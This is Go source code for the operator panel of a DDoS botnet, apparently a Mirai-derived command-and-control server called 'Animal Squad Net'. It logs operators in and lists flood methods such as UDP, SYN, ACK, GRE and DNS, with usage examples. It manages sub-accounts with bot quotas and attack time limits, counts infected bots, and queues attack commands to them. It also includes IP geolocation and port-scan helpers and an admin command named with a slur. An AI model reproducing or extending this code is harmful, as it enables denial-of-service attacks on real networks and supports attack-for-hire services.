package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
	s "strings"
	"net/http"
	"io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[1;37mConnection (tcp) \033[1;32msuccessful \x1b[38;5;196m!\r\n"))
    this.conn.Write([]byte("\033[1;37mLogin\033[1;32m:\033[1;37m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;37mPassword\033[1;32m:\033[1;37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(350 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1mChecking given credentials\033[0;32m... \033[1;32m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[1;32mThat login does not exist \x1b[38;5;196m!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Connected \007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\r\033[1;32mWelcome to The Animal Squad Net\x1b[38;5;196m!\r\n"))
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[1;37m[" + username + "\033[1;32m@\033[1;37manimals ~]#\033[1;32m "))
        cmd, err := this.ReadLine(false)
        
        if cmd == "cls" || cmd == "clear"  {

this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\r\033[1;32mWelcome to Animal Squad Net\x1b[38;5;196m!\r\n"))
            continue
        }
        if cmd == "help" || cmd == "HELP" {
            this.conn.Write([]byte("\033[01;32m                _   _                                                             \r\n"))
            this.conn.Write([]byte("               (.)_(.)                                                            \r\n"))
            this.conn.Write([]byte("            _ (   _   ) _                                                         \r\n"))
            this.conn.Write([]byte("           / \\/`-----'\\/ \\                                                     \r\n"))
            this.conn.Write([]byte("         __\\ ( (     ) ) /__                                                     \r\n"))
            this.conn.Write([]byte("         )   /\\ \\._./ /\\   (                                                   \r\n"))
            this.conn.Write([]byte("          )_/ /|\\   /|\\ \\_(                                                    \033[0m\r\n"))
            this.conn.Write([]byte("  _________________________________________                                       \r\n"))
            this.conn.Write([]byte(" |      \033[01;32mTools\033[0m       |                      |                                      \r\n"))
            this.conn.Write([]byte(" |__________________|______________________|                                      \r\n"))
            this.conn.Write([]byte(" | \033[01;32mresolve <DOMAIN>\033[0m | \033[01;32mDomain to IP\033[0m         |                                      \r\n"))
            this.conn.Write([]byte(" | \033[01;32mlocate\033[0m           | \033[01;32mGeolocate a IP\033[0m       |                                      \r\n"))
            this.conn.Write([]byte(" | \033[01;32mportscan <IP>\033[0m    | \033[01;32mPortscan a IP\033[0m        |                                      \r\n"))
            this.conn.Write([]byte(" |__________________|______________________|                                      \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mMethods\033[0m  |                             |_____________________________________ \r\n"))
            this.conn.Write([]byte(" |___________|_____________________________|                                     | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mudp\033[0m      | \033[01;32mUDP flood\033[0m                                                         | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mudpplain\033[0m | \033[01;32mUDP flood with less options. optimized for higher PPS\033[0m             | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mvse\033[0m      | \033[01;32mValve source engine specific flood\033[0m                                | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mdns\033[0m      | \033[01;32mDNS resolver flood using the targets domain, input IP is ignored\033[0m  | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32msyn\033[0m      | \033[01;32mSYN flood\033[0m                                                         | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mack\033[0m      | \033[01;32mACK flood\033[0m                                                         | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mstomp\033[0m    | \033[01;32mTCP stomp flood\033[0m                                                   | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mgreip\033[0m    | \033[01;32mGRE IP flood\033[0m                                                      | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mgreeth\033[0m   | \033[01;32mGRE Ethernet flood\033[0m                                                | \r\n"))
            this.conn.Write([]byte(" |___________|___________________________________________________________________| \r\n"))
            this.conn.Write([]byte(" |  \033[01;32musage\033[0m    | \033[01;32mmethod IP TIME dport=PORT\033[0m                                         | \r\n"))
            this.conn.Write([]byte(" |  \033[01;32mexample\033[0m  | \033[01;32mudp 1.1.1.1 60 dport=80\033[0m                                           | \r\n"))
            this.conn.Write([]byte(" |___________|___________________________________________________________________| \r\n"))
            continue

        }
		if s.Contains(cmd, "resolve ") == true {
			result := strings.Split(cmd, " ")
			url2res := result[1]
			if len(url2res) > 0 {
				this.conn.Write([]byte("\x1b[1;37mResolving domain :: \x1b[1;37m"+url2res+"\x1b[1;32m...\r\n"))
				ip, _ := net.LookupIP(url2res)
				if ip != nil {
					this.conn.Write([]byte("\x1b[1;37mResults For \x1b[1;32m"+url2res+" \x1b[1;37m\r\n"))
					for i := 0; i < len(ip); i++ {
						eyepee := ip[i].String()+"\r\n"
						this.conn.Write([]byte(eyepee))
					}
				}
			} else {
				continue
			}
		}
        
        if s.Contains(cmd, "portscan ") == true {
            info := strings.Split(cmd, " ") // split portscan to 2 pieces eg: portscan is 0 1.1.1.1 is 1
            targ_ip := info[1] // ip from sliced argument

            if len(targ_ip) > 0 {
                info := strings.Split(cmd, " ") // same as above
                targ_ip := info[1]
                nmap := "https://api.hackertarget.com/nmap/?q=" + targ_ip

                tr := &http.Transport {ResponseHeaderTimeout: 5*time.Second,DisableCompression: true,}
                client := &http.Client{Transport: tr, Timeout: 5*time.Second}
                nmapreq, err := client.Get(nmap)
                if err != nil {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1mUnable to send request.\033[37;1m\r\n")))
                    continue
                }

                nmapresp, err := ioutil.ReadAll(nmapreq.Body)

                if err != nil {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1mUnable to read response from request.\033[37;1m\r\n")))
                    continue
                }
                nmapstring := string(nmapresp)
                nmapscan := strings.Replace(nmapstring, "\n", "\r\n", -1)
                this.conn.Write([]byte("\r\n\033[01m\033[32m" + nmapscan + "\033[0m\r\n"))
                continue
            }
        }

        if err != nil || cmd == "exit" || cmd == "/quit" {
            return
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "au" || cmd == "+" || cmd == "/addfag" {
            this.conn.Write([]byte("Username\033[1;32m: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password\033[1;32m: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Bot Count \033[1;32m(-1 Access to All)\033[1;37m: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;32m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Attack Length \033[1;32m(-1 Unlimited)\033[1;37m: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[32;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown \033[1;32m(0 for none)\033[1;37m: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;32m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("User Information: \r\nUsername: " + new_un + "\r\nPassword\x1b[38;5;196m: " + new_pw + "\r\nBots[0;31m: " + max_bots_str + "\r\nContinue[0;31m? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;32m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[1;35mSuccessfully Added " + new_un + "\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "bots" || cmd  == "/b" {

		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;37m%s\033[1;32m: \033[1;37m%d\r\n", k, v)))
            }
            continue
		}
		
		if cmd == "locate" || cmd == "LOCATE" {
			this.conn.Write([]byte("\x1b[1;37mIP Address\x1b[1;32m: \x1b[1;37m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			org := "http://ipinfo.io/" + locipaddress + "/org"
			tr := &http.Transport {
				ResponseHeaderTimeout: 5*time.Second,
				DisableCompression: true,
			}
			client := &http.Client{Transport: tr, Timeout: 5*time.Second}
			orgresponse, err := client.Get(org)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			orgresponsedata, err := ioutil.ReadAll(orgresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			orgrespstring := string(orgresponsedata)
			orgformatted := strings.Replace(orgrespstring, "\n", "\r\n", -1)
			city := "http://ipinfo.io/" + locipaddress + "/city"
			tr1 := &http.Transport {
				ResponseHeaderTimeout: 5*time.Second,
				DisableCompression: true,
			}
			client1 := &http.Client{Transport: tr1, Timeout: 5*time.Second}
			cityresponse, err := client1.Get(city)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			cityresponsedata, err := ioutil.ReadAll(cityresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			cityrespstring := string(cityresponsedata)
			cityformatted := strings.Replace(cityrespstring, "\n", "\r\n", -1)
			country := "http://ipinfo.io/" + locipaddress + "/country"
			tr2 := &http.Transport {
				ResponseHeaderTimeout: 5*time.Second,
				DisableCompression: true,
			}
			client2 := &http.Client{Transport: tr2, Timeout: 5*time.Second}
			countryresponse, err := client2.Get(country)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			countryresponsedata, err := ioutil.ReadAll(countryresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			countryrespstring := string(countryresponsedata)
			countryformatted := strings.Replace(countryrespstring, "\n", "\r\n", -1)
			region := "http://ipinfo.io/" + locipaddress + "/region"
			tr3 := &http.Transport {
				ResponseHeaderTimeout: 5*time.Second,
				DisableCompression: true,
			}
			client3 := &http.Client{Transport: tr3, Timeout: 5*time.Second}
			regionresponse, err := client3.Get(region)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			regionresponsedata, err := ioutil.ReadAll(regionresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			regionrespstring := string(regionresponsedata)
			regionformatted := strings.Replace(regionrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[1;37mCity\x1b[1;32m: \x1b[1;37m" +cityformatted+ "\x1b[1;37mRegion\x1b[1;32m: \x1b[1;37m"+regionformatted+"\x1b[1;37mCountry\x1b[1;32m: \x1b[1;37m"+countryformatted+"\x1b[1;37mISP\x1b[1;32m: \x1b[1;37m" +orgformatted+"\n"))
			continue
		}
			 
		if userInfo.admin == 1 && cmd == "bots" || cmd  == "b" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\033[1;32mTotal Bots\033[1;37m:\t%d\r\n", botCount)))
            continue
		} 

	    if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
